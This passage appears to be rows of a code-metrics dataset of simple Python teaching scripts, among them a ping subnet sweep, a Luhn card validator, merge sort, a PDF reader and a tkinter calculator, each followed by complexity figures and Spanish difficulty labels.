# When open item is a directory (python2)
except IOError:
    pass
# When open item is a directory (python3)
except IsADirectoryError:
    pass

file_stats = os.stat(file_name)
# create a dictionary to hold file info
file_info = {
    ""fname"": file_name,
    ""fsize"": file_stats[stat.ST_SIZE],
    ""f_lm"": time.strftime(
        ""%d/%m/%Y %I:%M:%S %p"", time.localtime(file_stats[stat.ST_MTIME])
    ),
    ""f_la"": time.strftime(
        ""%d/%m/%Y %I:%M:%S %p"", time.localtime(file_stats[stat.ST_ATIME])
    ),
    ""f_ct"": time.strftime(
        ""%d/%m/%Y %I:%M:%S %p"", time.localtime(file_stats[stat.ST_CTIME])
    ),
    ""no_of_lines"": count,
    ""t_char"": t_char,
}
# print out the file info
file_info_keys = (
    ""file name"",
    ""file size"",
    ""last modified"",
    ""last accessed"",
    ""creation time"",
    ""Total number of lines are"",
    ""Total number of characters are"",
)
file_info_vales = (
    file_info[""fname""],
    str(file_info[""fsize""]) + "" bytes"",
    file_info[""f_lm""],
    file_info[""f_la""],
    file_info[""f_ct""],
    file_info[""no_of_lines""],
    file_info[""t_char""],
)

for f_key, f_value in zip(file_info_keys, file_info_vales):
    print(f_key, "" ="", f_value)

# check the `file` is direcotry
# print out the file stats
if stat.S_ISDIR(file_stats[stat.ST_MODE]):
    print(""This a directory."")
else:
    file_stats_fmt = """"
    print(""\nThis is not a directory."")
    stats_keys = (
        ""st_mode (protection bits)"",
        ""st_ino (inode number)"",
        ""st_dev (device)"",
        ""st_nlink (number of hard links)"",
        ""st_uid (user ID of owner)"",
        ""st_gid (group ID of owner)"",
        ""st_size (file size bytes)"",
        ""st_atime (last access time seconds since epoch)"",
        ""st_mtime (last modification time)"",
        ""st_ctime (time of creation Windows)"",
    )
    for s_key, s_value in zip(stats_keys, file_stats):
        print(s_key, "" ="", s_value)
",2787,37,77,9,18,16,0,0.0,0,2,2,4.0,4,6.0,6,10.0,15.509775004326936,1.0,alto,No,True,False,Low,id199
List.py,"List = []
# List is Muteable
# means value can be change
List.insert(0, 5) #insertion takes place at mentioned index
List.insert(1, 10) 
List.insert(0, 6)
print(List)
List.remove(6) 
List.append(9) #insertion takes place at last 
List.append(1)
List.sort()    #arranges element in ascending order
print(List)
List.pop()
List.reverse()
print(List)
""""""
List.append(1)
print(List)
List.append(2)
print(List)
List.insert(1 , 3)
print(List)
""""""

list2 = [2, 3, 7, 5, 10, 17, 12, 4, 1, 13]
for i in list2:
    if i % 2 == 0:
        print(i)
""""""
Expected Output:
2
10
12
4
""""""
",606,19,17,1,5,2,15,0.0,0,2,2,4.0,4,,6,10.0,15.509775004326936,1.0,alto,No,False,False,Low,id200
Memory_game.py,"import random

import simplegui


def new_game():
    global card3, po, state, exposed, card1

    def create(card):
        while len(card) != 8:
            num = random.randrange(0, 8)
            if num not in card:
                card.append(num)
        return card

    card3 = []
    card1 = []
    card2 = []
    po = []
    card1 = create(card1)
    card2 = create(card2)
    card1.extend(card2)
    random.shuffle(card1)
    state = 0
    exposed = []
    for i in range(0, 16, 1):
        exposed.insert(i, False)


def mouseclick(pos):
    global card3, po, state, exposed, card1
    if state == 2:
        if card3[0] != card3[1]:
            exposed[po[0]] = False
            exposed[po[1]] = False
        card3 = []
        state = 0
        po = []
    ind = pos[0] // 50
    card3.append(card1[ind])
    po.append(ind)
    if exposed[ind] == False and state < 2:
        exposed[ind] = True
        state += 1


def draw(canvas):
    global card1
    gap = 0
    for i in range(0, 16, 1):
        if exposed[i] == False:
            canvas.draw_polygon(
                [[0 + gap, 0], [0 + gap, 100], [50 + gap, 100], [50 + gap, 0]],
                1,
                ""Black"",
                ""Green"",
            )
        elif exposed[i] == True:
            canvas.draw_text(str(card1[i]), [15 + gap, 65], 50, ""White"")
        gap += 50


frame = simplegui.create_frame(""Memory"", 800, 100)
frame.add_button(""Reset"", new_game)
label = frame.add_label(""Turns = 0"")

frame.set_mouseclick_handler(mouseclick)
frame.set_draw_handler(draw)

new_game()
frame.start()
",1585,53,58,13,0,0,0,4.0,11,17,7,34.0,22,,51,117.75898006442377,247.75703075150625,5.409090909090909,bajo,No,False,True,Medium,id201
Python-Array-Equilibrium-Index.py,"""""""Array Equilibrium Index
Send Feedback
Find and return the equilibrium index of an array. Equilibrium index of an array is an index i such that the sum of elements at indices less than i is equal to the sum of elements at indices greater than i.
Element at index i is not included in either part.
If more than one equilibrium index is present, you need to return the first one. And return -1 if no equilibrium index is present.
Input format :
Line 1 : Size of input array
Line 2 : Array elements (separated by space)
Constraints:
Time Limit: 1 second
Size of input array lies in the range: [1, 1000000]
Sample Input :
7
-7 1 5 2 -4 3 0
Sample Output :
3 """"""
def equilibrium(arr): 
  
    # finding the sum of whole array 
    total_sum = sum(arr) 
    leftsum = 0
    for i, num in enumerate(arr): 
          
        # total_sum is now right sum 
        # for index i 
        total_sum -= num 
          
        if leftsum == total_sum: 
            return i 
        leftsum += num 
       
      # If no equilibrium index found,  
      # then return -1 
    return -1
n = int(input())
arr = [int(i) for i in input().strip().split()]
print(equilibrium(arr))
",1166,13,12,4,5,5,16,1.0,3,4,4,7.0,4,8.0,11,16.0,33.0,3.5,medio,No,True,False,Low,id202
variation1.py,"try:
    input = raw_input
except NameError:
    pass


def count_chars(filename):
    count = {}

    with open(filename) as info:  # inputFile Replaced with filename
        readfile = info.read()
        for character in readfile.upper():
            count[character] = count.get(character, 0) + 1

    return count


def main():
    is_exist = True
    # Try to open file if exist else raise exception and try again
    while is_exist:
        try:
            inputFile = input(""File Name / (0)exit : "").strip()
            if inputFile == ""0"":
                break
            print(count_chars(inputFile))
        except FileNotFoundError:
            print(""File not found...Try again!"")


if __name__ == ""__main__"":
    main()
",737,23,23,8,2,1,0,2.0,6,3,2,6.0,6,,9,17.509775004326936,27.0,1.0,medio,No,True,False,Low,id203
ping_subnet.py,"from __future__ import print_function

import os  # Load the Library Module
import subprocess  # Load the Library Module
import sys  # Load the Library Module

# Script Name		: ping_subnet.py
# Author				: Craig Richards
# Created				: 12th January 2012
# Last Modified		:
# Version				: 1.0
# Modifications		:
# Description			: After supplying the first 3 octets it will scan the final range for available addresses

filename = sys.argv[0]  # Sets a variable for the script name

if (
    ""-h"" in sys.argv or ""--h"" in sys.argv or ""-help"" in sys.argv or ""--help"" in sys.argv
):  # Help Menu if called
    print(
        """"""
You need to supply the first octets of the address Usage : """"""
        + filename
        + """""" 111.111.111 """"""
    )
    sys.exit(0)
else:

    if (
        len(sys.argv) < 2
    ):  # If no arguments are passed then display the help and instructions on how to run the script
        sys.exit(
            "" You need to supply the first octets of the address Usage : ""
            + filename
            + "" 111.111.111""
        )

    subnet = sys.argv[1]  # Set the variable subnet as the three octets you pass it

    if os.name == ""posix"":  # Check the os, if it's linux then
        myping = ""ping -c 2 ""  # This is the ping command
    elif os.name in (""nt"", ""dos"", ""ce""):  # Check the os, if it's windows then
        myping = ""ping -n 2 ""  # This is the ping command

    f = open(""ping_"" + subnet + "".log"", ""w"")  # Open a logfile
    for ip in range(2, 255):  # Set the ip variable for the range of numbers
        ret = subprocess.call(
            myping + str(subnet) + ""."" + str(ip),
            shell=True,
            stdout=f,
            stderr=subprocess.STDOUT,
        )  # Run the command pinging the servers
        if ret == 0:  # Depending on the response
            f.write(
                subnet + ""."" + str(ip) + "" is alive"" + ""\n""
            )  # Write out that you can receive a reponse
        else:
            f.write(
                subnet + ""."" + str(ip) + "" did not respond"" + ""\n""
            )  # Write out you can't reach the box
",2097,23,45,8,24,7,0,,0,26,5,54.0,44,,80,251.8246316944779,449.1767875292167,3.0681818181818183,medio,No,False,False,Medium,id204
A solution to project euler problem 3.py,"""""""
Problem:
The prime factors of 13195 are 5,7,13 and 29. What is the largest prime factor
of a given number N?

e.g. for 10, largest prime factor = 5. For 17, largest prime factor = 17.
""""""


# def solution(n: int) -> int:
def solution(n: int = 600851475143) -> int:
    """"""Returns the largest prime factor of a given number n.
    >>> solution(13195)
    29
    >>> solution(10)
    5
    >>> solution(17)
    17
    >>> solution(3.4)
    3
    >>> solution(0)
    Traceback (most recent call last):
        ...
    ValueError: Parameter n must be greater or equal to one.
    >>> solution(-17)
    Traceback (most recent call last):
        ...
    ValueError: Parameter n must be greater or equal to one.
    >>> solution([])
    Traceback (most recent call last):
        ...
    TypeError: Parameter n must be int or passive of cast to int.
    >>> solution(""asd"")
    Traceback (most recent call last):
        ...
    TypeError: Parameter n must be int or passive of cast to int.
    """"""
    try:
        n = int(n)
    except (TypeError, ValueError):
        raise TypeError(""Parameter n must be int or passive of cast to int."")
    if n <= 0:
        raise ValueError(""Parameter n must be greater or equal to one."")

    i = 2
    ans = 0

    if n == 2:
        return 2

    while n > 2:
        while n % i != 0:
            i += 1

        ans = i

        while n % i == 0:
            n = n / i

        i += 1

    return int(ans)


if __name__ == ""__main__"":
    # print(solution(int(input().strip())))
    import doctest

    doctest.testmod()
    print(solution(int(input().strip())))
",1606,25,23,13,2,2,32,1.0,7,11,7,22.0,9,16.0,33,48.18080946738404,132.0,8.555555555555555,medio,No,True,False,Medium,id205
mustache-add-on-face.py,"import cv2

from utils import image_resize

cap = cv2.VideoCapture(0)

face_cascade = cv2.CascadeClassifier(""face.xml"")

nose_cascade = cv2.CascadeClassifier(""Nose.xml"")

mustache = cv2.imread(""image/mustache.png"", -1)

while True:

    ret, frame = cap.read()
    gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
    faces = face_cascade.detectMultiScale(gray, scaleFactor=1.5, minNeighbors=5)

    frame = cv2.cvtColor(frame, cv2.COLOR_BGR2BGRA)

    for (x, y, w, h) in faces:
        roi_gray = gray[y : y + h, x : x + h]  # rec
        roi_color = frame[y : y + h, x : x + h]

        nose = nose_cascade.detectMultiScale(roi_gray, scaleFactor=1.5, minNeighbors=5)
        for (nx, ny, nw, nh) in nose:

            roi_nose = roi_gray[ny : ny + nh, nx : nx + nw]
            mustache2 = image_resize(mustache.copy(), width=nw)

            mw, mh, mc = mustache2.shape
            for i in range(0, mw):
                for j in range(0, mh):

                    if mustache2[i, j][3] != 0:  # alpha 0
                        roi_color[ny + int(nh / 2.0) + i, nx + j] = mustache2[i, j]

    # Display the resulting frame
    frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)

    cv2.imshow(""frame"", frame)
    if cv2.waitKey(20) & 0xFF == ord(""x""):
        break

cap.release()
cv2.destroyAllWindows()
",1306,32,29,16,3,1,0,0.0,0,14,6,27.0,19,,41,96.22039775975506,190.3981037807637,4.2631578947368425,medio,No,False,False,Low-Medium,id206
Credit_Card_Validator.py,"# luhn algorithm


class CreditCard:
    def __init__(self, card_no):
        self.card_no = card_no

    @property
    def company(self):
        comp = None
        if str(self.card_no).startswith(""4""):
            comp = ""Visa Card""
        elif str(self.card_no).startswith(
            (
                ""50"",
                ""67"",
                ""58"",
                ""63"",
            )
        ):
            comp = ""Maestro Card""
        elif str(self.card_no).startswith(""5""):
            comp = ""Master Card""
        elif str(self.card_no).startswith(""37""):
            comp = ""American Express Card""
        elif str(self.card_no).startswith(""62""):
            comp = ""Unionpay Card""
        elif str(self.card_no).startswith(""6""):
            comp = ""Discover Card""
        elif str(self.card_no).startswith(""35""):
            comp = ""JCB Card""
        elif str(self.card_no).startswith(""7""):
            comp = ""Gasoline Card""

        return ""Company : "" + comp

    def first_check(self):
        if 13 <= len(self.card_no) <= 19:
            message = ""First check : Valid in terms of length.""

        else:
            message = ""First check : Check Card number once again it must be of 13 or 16 digits long.""
        return message

    def validate(self):
        # double every second digit from right to left
        sum_ = 0
        crd_no = self.card_no[::-1]
        for i in range(len(crd_no)):
            if i % 2 == 1:
                double_it = int(crd_no[i]) * 2

                if len(str(double_it)) == 2:
                    sum_ += sum([eval(i) for i in str(double_it)])

                else:
                    sum_ += double_it

            else:
                sum_ += int(crd_no[i])

        if sum_ % 10 == 0:
            response = ""Valid Card""
        else:
            response = ""Invalid Card""

        return response

    @property
    def checksum(self):
        return ""#CHECKSUM# : "" + self.card_no[-1]

    @classmethod
    def set_card(cls, card_to_check):
        return cls(card_to_check)


card_number = input()
card = CreditCard.set_card(card_number)
print(card.company)
print(""Card : "", card.card_no)
print(card.first_check())
print(card.checksum)
print(card.validate())

# 79927398713
# 4388576018402626
# 379354508162306
",2374,60,66,17,5,5,0,6.0,24,15,6,27.0,21,,42,107.74844088268092,199.7052750908657,3.857142857142857,medio,Yes,True,False,Low-Medium,id207
Armstrong_number.py,"""""""
In number theory, a narcissistic number (also known as a pluperfect digital invariant (PPDI), an Armstrong number (after Michael F. Armstrong) or a plus perfect number), 
in a given number base b, is a number that is the total of its own digits each raised to the power of the number of digits.
Source: https://en.wikipedia.org/wiki/Narcissistic_number
NOTE:
this scripts only works for number in base 10
""""""

def is_armstrong_number(number:str):
    total:int = 0
    exp:int = len(number) #get the number of digits, this will determinate the exponent

    digits:list[int] = []
    for digit in number: digits.append(int(digit)) #get the single digits
    for x in digits: total += x ** exp #get the power of each digit and sum it to the total
    
    # display the result
    if int(number) == total:
       print(number,""is an Armstrong number"")
    else:
       print(number,""is not an Armstrong number"")

number = input(""Enter the number : "")
is_armstrong_number(number)
",1006,18,12,4,4,1,7,1.0,4,3,3,6.0,5,,9,16.36452797660028,27.0,1.8,alto,No,True,False,Low,id208
textRead.py,"from speakListen import hear
from speakListen import speak
import docx
import fitz
import time
from rich.console import Console # pip3 install Rich
from rich.table import Table
from colorama import Fore

def ms_word():
    """"""[Print and speak out a ms_word docx file as specified in the path]
    """"""    
    # TODO : Take location input from the user
    try:
        speak(""Enter the document's location - "")
        location = input(""Enter the document's location - "")
        
        file_loc = doubleslash(location) 
       
        doc = docx.Document(file_loc)
        fullText = []
        for para in doc.paragraphs:
            fullText.append(para.text)
        #print(fullText)
        doc_file = '\n'.join(fullText)
        print(doc_file)
        speak(doc_file)
    except Exception as exp:
        #print(exp)
        print(f""ERROR - {exp}"")
        print(Fore.YELLOW + ""I could'nt locate the file!\nIf you didn't specify the extension of the file, please specify it."")
        return ""None""

def pdf_read():
    """"""[Print and speak out the pdf on specified path]
    """"""    
    try:
        speak(""Enter the document's location - "")
        location = input(""Enter the document's location - "")
        
        path = doubleslash(location) 
        pdf = fitz.open(path)
        details = pdf.metadata # Stores the meta-data which generally includes Author name and Title of book/document.
        total_pages = pdf.pageCount # Stores the total number of pages

    except Exception as exp:
        print(f""ERROR - {exp}"")
        print(Fore.YELLOW + ""I could'nt locate the file!\nIf you didn't specify the extension of the file, please specify it."")
        return ""None""
    try :
        """"""     1. Author
                2. Creator
                3. Producer
                4. Title  """"""   
        
        author =  details[""author""]
        #print(""Author : "",author)
        
        title = details[""title""]
        #print(""Title : "",title) 
            
        #print(details)
        #print(""Total Pages : "",total_pages)
        book_details(author, title, total_pages)
        speak(f"" Title {title}"")
        speak(f"" Author {author}"")
        speak(f"" Total Pages {total_pages}"")
        
        # TODO : Deal with the Index
        toc = pdf.get_toc()
        print(""Say 1 or \""ONLY PRINT INDEX\"" - if you want me to print the book's index.\nSay 2 if you want me to print and make me speak out the book's index.\nSay any key if you don't want to print the index.'"")
        speak(""Say 1 or only print index if you want me to print the book's index.\nSay 2 if you want me to print and make me speak out the book's index.\nSay any key if you don't want to print the index.'"")
        q = hear().lower()

        if ""only print"" in q or ""1"" in q or ""one"" in q or ""vone"" in q or 'only' in q or ""index only"" in q or 'only' in q or ""print only"" in q: 
            print_index(toc)
            time.sleep(15)
        elif ""speak"" in q or ""2"" in q or 'two' in q: 
            print_n_speak_index(toc)
            time.sleep(10)
        elif q == ""None"":
            print(""I could'nt understand what you just said!"")
            speak(""I could'nt understand what you just said!"")
            time.sleep(4)
        else: 
            time.sleep(4)
            pass

    
        """"""Allow the user to do the following
        1. Read/speak a page
        2. Read/speak a range of pages
        3. Lesson
        4. Read/speak a whole book
        """"""  
        
        #time.sleep(5)
  
        print(""____________________________________________________________________________________________________________"")
        print(""1. Print/speak a single page\n2. Print/speak a range of pages\n3. Print/speak a Lesson\n4. Read/speak a whole book"")
        speak(""1. Print/speak a single page\n2. Print/speak a range of pages\n3. Print/speak a Lesson\n4. Read/speak a whole book"")
        q = hear().lower()
        if ""single"" in q or ""one"" in q or ""vone"" in q or ""one page"" in q or ""vone page"" in q or ""1 page"" in q:
            try:
                pgno = int(input(""Page Number - ""))

                page = pdf.load_page(pgno - 1)
                text = page.get_text('text')
                print(""\n\n"")
                print(text.replace('\t',' '))
                speak(text.replace('\t',' '))
            except Exception:
                print(""Sorry, I could recognize what you entered. Please re-enter the Page Number."")
                speak(""Sorry, I could recognize what you entered. Please re-enter the Page Number."")
                pgno = input(""Page no. - "")
                page = pdf.load_page(pgno - 1)
                text = page.get_text('text')
                print(text.replace('\t',' '))
                speak(text.replace('\t',' '))

        
        elif 'range' in q or ""multiple"" in q:
            try:
                start_pg_no = int(input(""Starting Page Number - ""))
                end_pg_no = int(input(""End Page Number - ""))
                for i in range(start_pg_no - 1, end_pg_no):
                    page = pdf.load_page(i)
                    text = page.get_text('text')
                    print(text.replace('\t',' '))
                    speak(text.replace('\t',' '))
            except Exception:
                print(""Sorry, I could recognize what you entered. Please re-enter the Page Number."")
                speak(""Sorry, I could recognize what you entered. Please re-enter the Page Number."")
                start_pg_no = int(input(""Starting Page Number - ""))
                end_pg_no = int(input(""End Page Number - ""))
                for i in range(start_pg_no - 1, end_pg_no - 1):
                    page = pdf.load_page(i)
                    text = page.get_text('text')
                    print(text.replace('\t',' '))
                    speak(text.replace('\t',' '))

        elif 'lesson' in q:
            try:
                key = input(""Lesson name - "")
                start_pg_no, end_pg_no = search_in_toc(toc, key, total_pages)
                if start_pg_no != None and end_pg_no != None:
                    start_pg_no, end_pg_no = map(int,search_in_toc(toc, key, total_pages))
                
                    for i in range(start_pg_no - 1, end_pg_no):
                        page = pdf.load_page(i)
                        text = page.get_text('text')
                        print(text.replace('\t',' '))
                        speak(text.replace('\t',' '))
                else: 
                    print(""Try Again."")
                    speak(""Try Again."")
                    speak(""Lesson name"")
                    key = input(""Lesson name - "")
                    start_pg_no, end_pg_no = map(int,search_in_toc(toc, key, total_pages))
                    if start_pg_no != None and end_pg_no != None:
                        for i in range(start_pg_no - 1, end_pg_no):
                            page = pdf.load_page(i)
                            text = page.get_text('text')
                            print(text.replace('\t',' '))
                            speak(text.replace('\t',' '))
                    
            except Exception:
                print(""Try Again! Lesson could not be found."")
                speak(""Try Again.Lesson could not be found"")
                speak(""Lesson name"")
                key = input(""Lesson name - "")
                start_pg_no, end_pg_no = search_in_toc(toc, key, total_pages)
                if start_pg_no != None and end_pg_no != None:
                    start_pg_no, end_pg_no = map(int,search_in_toc(toc, key, total_pages))
                
                    for i in range(start_pg_no - 1, end_pg_no):
                        page = pdf.load_page(i)
                        text = page.get_text('text')
                        print(text.replace('\t',' '))
                        speak(text.replace('\t',' '))
                else: 
                    print(""Sorry, I cannot find the perticular lesson."")
                    speak(""Sorry, I cannot find the perticular lesson."")

        elif ""whole"" in q or 'complete' in q:
            for i in range(total_pages):
                page = pdf.load_page(i)
                text = page.get_text('text')
                print(text.replace('\t',' '))
                speak(text.replace('\t',' '))

        elif q == ""None"":
            print(""I could'nt understand what you just said!"")
            speak(""I could'nt understand what you just said!"")
        else:
            print(""You didn't say a valid command!"")
            time.sleep(5)
    except Exception as e: 
        print(e)
    pass
    pdf.close()

def doubleslash(text):
    """"""Replaces / with // 

    Args:
        text (str): location

    Returns:
        str: formatted location
    """"""
    return text.replace('\\' , '\\\\')

def print_index(toc):
    """"""Prints out the index in proper format with title name and page number

    Args:
        toc (nested list): toc[1] - Topic name
                           toc[2] - Page number
    """"""
    dash = ""-""*(100 - 7)
    space = "" ""*47
    print(f""{space}INDEX"")
    print(f""\n\nName : {dash} PageNo.\n\n\n"")
    for topic in toc:
        eq_dash = ""-""*(100 - len(topic[1]))
        print(f""{topic[1]} {eq_dash} {topic[2]}"")
        
def print_n_speak_index(toc):
    """"""Along with printing, it speaks out the index too.

    Args:
        toc (nested list): toc[1] - Topic name
                           toc[2] - Page number
    """"""
    dash = ""-""*(100 - 7)
    space = "" ""*47
    print(f""{space}INDEX"")
    print(f""\n\nName : {dash} PageNo.\n\n\n\n"")
    for topic in toc:
        eq_dash = ""-""*(100 - len(topic[1]))
        print(f""{topic[1]} {eq_dash} {topic[2]}"")
        speak(f""{topic[1]}  {topic[2]}"")

def search_in_toc(toc, key, totalpg):
    """"""Searches a particular lesson name provided as a parameter in toc and returns its starting and ending page numbers.

    Args:
        toc (nested list): toc[1] - Topic name
                           toc[2] - Page number
        key (str): the key to be found
        totalpg (int): total pages in book/document

    Returns:
        int: staring and ending page numbers of lesson found.
        If not found then return None
    """"""
    for i in range(len(toc) - 1):
        topic = toc[i]
        if i != len(toc) - 2:
            if topic[1] == key:
                nexttopic = toc[i + 1]
                return (topic[2], nexttopic[2])
            elif topic[1].lower() == key:
                nexttopic = toc[i + 1]
                return (topic[2], nexttopic[2])
        else:
            if topic[1] == key:
                return (topic[2], totalpg)
            elif topic[1].lower() == key:
               
                return (topic[2], totalpg)
    return None,None

def book_details(author, title, total_pages):
    """"""Creates a table of book details like author name, title, and total pages.

    Args:
        author (str): Name of author
        title (str): title of the book
        total_pages (int): total pages in the book
    """"""
    table = Table(title=""\nBook Details :- "", show_lines = True) 

    table.add_column(""Sr. No."", style=""magenta"", no_wrap=True)
    table.add_column(""Property"", style=""cyan"")
    table.add_column(""Value"", justify=""left"", style=""green"")

    table.add_row(""1"", ""Title"", f""{title}"")
    table.add_row(""2"", ""Author"", f""{author}"")
    table.add_row(""3"", ""Pages"", f""{total_pages}"")

    console = Console()
    console.print(table)
   
#ms_word()
#pdf_read()
#book_details(""abc"", ""abcde"", 12)
",11852,208,199,41,15,12,46,7.0,58,67,8,145.0,84,,212,560.9546635134159,1382.995134684087,6.904761904761905,bajo,No,True,False,High,id209
images.py,"import os

from PIL import Image
from fpdf import FPDF

# Author: @NavonilDas

# Example to Append all the images inside a folder to pdf
pdf = FPDF()

# Size of a A4 Page in mm Where P is for Potrait and L is for Landscape
A4_SIZE = {""P"": {""w"": 210, ""h"": 297}, ""L"": {""w"": 297, ""h"": 210}}
# pdf may produce empty page so we need to set auto page break as false
pdf.set_auto_page_break(0)

for filename in os.listdir(""images""):
    try:
        # Read Image file so that we can cover the complete image properly and if invalid image file skip those files
        img = Image.open(""images\\"" + filename)

        # Read Width and Height
        width, height = img.size

        # Close opened Image
        img.close()

        # Convert Width and Height into mm from px as 1px  = 0.2645833333 mm
        width, height = float(width * 0.264583), float(height * 0.264583)

        # Check if Width is greater than height so to know the image is in landscape or else in potrait
        orientation = ""P"" if width < height else ""L""

        # Read the minimum of A4 Size and the image size
        width = min(A4_SIZE[orientation][""w""], width)
        height = min(A4_SIZE[orientation][""h""], height)

        # Add Page With an orientation
        pdf.add_page(orientation=orientation)
        # Add Image with their respective width and height in mm
        pdf.image(""images\\"" + filename, 0, 0, width, height)

    except OSError:
        print(""Skipped : "" + filename)

pdf.output(""output.pdf"", ""F"")
",1499,21,20,13,12,12,0,0.0,0,6,3,12.0,6,,18,20.264662506490406,57.058650025961626,3.0,alto,No,False,False,Low,id210
Merge Sort.py,"# Python program for implementation of MergeSort

# Merges two subarrays of arr[].
# First subarray is arr[l..m]
# Second subarray is arr[m+1..r]


def merge(arr, l, m, r):
    n1 = m - l + 1
    n2 = r - m

    # create temp arrays
    L = [0] * (n1)
    R = [0] * (n2)

    # Copy data to temp arrays L[] and R[]
    for i in range(0, n1):
        L[i] = arr[l + i]

    for j in range(0, n2):
        R[j] = arr[m + 1 + j]

    # Merge the temp arrays back into arr[l..r]
    i = 0  # Initial index of first subarray
    j = 0  # Initial index of second subarray
    k = l  # Initial index of merged subarray

    while i < n1 and j < n2:
        if L[i] <= R[j]:
            arr[k] = L[i]
            i += 1
        else:
            arr[k] = R[j]
            j += 1
        k += 1

    # Copy the remaining elements of L[], if there
    # are any
    while i < n1:
        arr[k] = L[i]
        i += 1
        k += 1

    # Copy the remaining elements of R[], if there
    # are any
    while j < n2:
        arr[k] = R[j]
        j += 1
        k += 1


# l is for left index and r is right index of the
# sub-array of arr to be sorted


def mergeSort(arr, l, r):
    if l < r:
        # Same as (l+r)//2, but avoids overflow for
        # large l and h
        m = l + (r - l) // 2

        # Sort first and second halves
        mergeSort(arr, l, m)
        mergeSort(arr, m + 1, r)
        merge(arr, l, m, r)


# Driver code to test above
arr = [12, 11, 13, 5, 6, 7]
n = len(arr)
print(""Given array is"")
for i in range(n):
    print(""%d"" % arr[i]),

mergeSort(arr, 0, n - 1)
print(""\n\nSorted array is"")
for i in range(n):
    print(""%d"" % arr[i]),
",1659,43,43,18,20,17,0,2.0,10,29,8,58.0,29,,87,164.8814488586996,453.2224428097186,8.0,medio,No,False,False,Medium-High,id211
find_prime.py,"""""""Author Anurag Kumar(mailto:anuragkumara95@gmail.com)

A prime number is a natural number that has exactly two distinct natural number divisors: 1 and itself.

#USAGE:
  - $pythonfind_prime.py <num:int>

##THEORY
-Sieve of Eratosthenes(source:wikipedia.com)
    In mathematics, the sieve of Eratosthenes is a simple, ancient algorithm for finding all prime numbers up to any given limit.

    It does so by iteratively marking as composite (i.e., not prime) the multiples of each prime, starting with the first prime 
    number, 2. The multiples of a given prime are generated as a sequence of numbers starting from that prime, with constant 
    difference between them that is equal to that prime. This is the sieve's key distinction from using trial division to 
    sequentially test each candidate number for divisibility by each prime.

    To find all the prime numbers less than or equal to a given integer n by Eratosthenes' method:

      - Create a list of consecutive integers from 2 through n: (2, 3, 4, ..., n).
      - Initially, let p equal 2, the smallest prime number.
      - Enumerate the multiples of p by counting to n from 2p in increments of p, and mark them in the list (these will be 2p, 
        3p, 4p, ...; the p itself should not be marked).
      - Find the first number greater than p in the list that is not marked. If there was no such number, stop. Otherwise, let 
        p now equal this new number (which is the next prime), and repeat from step 3.
      - When the algorithm terminates, the numbers remaining not marked in the list are all the primes below n.
""""""
import sys


def find_prime(num):
    res_list = []
    for i in range(2, num + 1):
        if res_list != [] and any(i % l == 0 for l in res_list):
            continue
        res_list.append(i)
    return res_list


if __name__ == ""__main__"":
    if len(sys.argv) != 2:
        raise Exception(""usage - $python find_prime.py <num:int>"")
    try:
        num = int(sys.argv[1])
    except ValueError:
        raise Exception(""Enter an integer as argument only."")
    l = find_prime(num)
    print(l)
",2108,18,17,10,0,0,20,1.0,5,7,5,14.0,14,,21,64.91260938324326,89.20647778231529,2.5,alto,No,False,False,Low,id212
calculator-gui.py,"# ==================== Libraries ====================
import tkinter as tk
from tkinter import ttk
from tkinter import messagebox

# ===================================================
# ==================== Classes ======================


class Inside:
    def __init__(self, parent):
        self.parent = parent
        # ----- Main Frame -----
        self.cal_frame = ttk.Frame(self.parent)
        self.cal_frame.grid(row=0, column=0)
        # ----------------------
        # ----- Variable For Main Output -----
        self.out_var = tk.StringVar()
        # ----- Operator Chooser -----
        self.opr = tk.StringVar()
        # ----- Values Holder -----
        self.value1 = tk.StringVar()
        self.value2 = tk.StringVar()
        # ------------------------------------
        self.output_box()  # <---------- Output Box Shower
        self.cal_buttons()  # <---------- Buttons On Calculator

    def output_box(self):
        show = ttk.Entry(
            self.cal_frame,
            textvariable=self.out_var,
            width=25,
            font=(""calibri"", 16),
            state=""readonly"",
        )
        show.grid(row=0, column=0, sticky=tk.W, ipady=6, ipadx=1, columnspan=4)
        show.focus()

    # ========== * Button Events * ========== < --- Sequence 789456123
    def press_7(self):
        current = self.out_var.get()
        if current == """":
            self.out_var.set(7)
        else:
            current += str(7)
            self.out_var.set(current)

    def press_8(self):
        current = self.out_var.get()
        if current == """":
            self.out_var.set(8)
        else:
            current += str(8)
            self.out_var.set(current)

    def press_9(self):
        current = self.out_var.get()
        if current == """":
            self.out_var.set(9)
        else:
            current += str(9)
            self.out_var.set(current)

    def press_4(self):
        current = self.out_var.get()
        if current == """":
            self.out_var.set(4)
        else:
            current += str(4)
            self.out_var.set(current)

    def press_5(self):
        current = self.out_var.get()
        if current == """":
            self.out_var.set(5)
        else:
            current += str(5)
            self.out_var.set(current)

    def press_6(self):
        current = self.out_var.get()
        if current == """":
            self.out_var.set(6)
        else:
            current += str(6)
            self.out_var.set(current)

    def press_1(self):
        current = self.out_var.get()
        if current == """":
            self.out_var.set(1)
        else:
            current += str(1)
            self.out_var.set(current)

    def press_2(self):
        current = self.out_var.get()
        if current == """":
            self.out_var.set(2)
        else:
            current += str(2)
            self.out_var.set(current)

    def press_3(self):
        current = self.out_var.get()
        if current == """":
            self.out_var.set(3)
        else:
            current += str(3)
            self.out_var.set(current)

    def press_0(self):
        current = self.out_var.get()
        if current == """":
            self.out_var.set(0)
        else:
            current += str(0)
            self.out_var.set(current)

    # ========== Operators Button Handling Function ==========
    def press_clear(self):
        self.out_var.set("""")

    def press_reset(self):
        self.out_var.set("""")

    def press_plus(self):
        self.value1 = self.out_var.get()
        if self.value1 == """":
            messagebox.showwarning(
                ""Operator Before Number"", ""Please Enter Number Before Operator""
            )
        else:
            self.out_var.set("""")
            self.opr = ""+""

    def press_min(self):
        self.value1 = self.out_var.get()
        if self.value1 == """":
            messagebox.showwarning(
                ""Operator Before Number"", ""Please Enter Number Before Operator""
            )
        else:
            self.out_var.set("""")
            self.opr = ""-""

    def press_mul(self):
        self.value1 = self.out_var.get()
        if self.value1 == """":
            messagebox.showwarning(
                ""Operator Before Number"", ""Please Enter Number Before Operator""
            )
        else:
            self.out_var.set("""")
            self.opr = ""*""

    def press_div(self):
        self.value1 = self.out_var.get()
        if self.value1 == """":
            messagebox.showwarning(
                ""Operator Before Number"", ""Please Enter Number Before Operator""
            )
        else:
            self.out_var.set("""")
            self.opr = ""/""

    # ==============================================
    # ========== ***** Equal Button Function ***** ==========
    def press_equal(self):
        self.value2 = self.out_var.get()
        if self.value2 == """":
            messagebox.showerror(
